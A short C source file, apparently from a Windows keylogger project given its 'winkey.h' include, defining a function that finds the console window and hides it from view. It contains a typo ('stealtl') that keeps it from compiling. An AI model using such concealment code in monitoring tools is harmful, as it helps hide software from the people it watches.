#include "winkey.h"


void    HideWindow(void)
{
    HWND    stealth;

    stealth = FindWindowA("ConsoleWindowClass", NULL);

    if (stealtl != NULL)
        ShowWindow(stealth, SW_HIDE);
}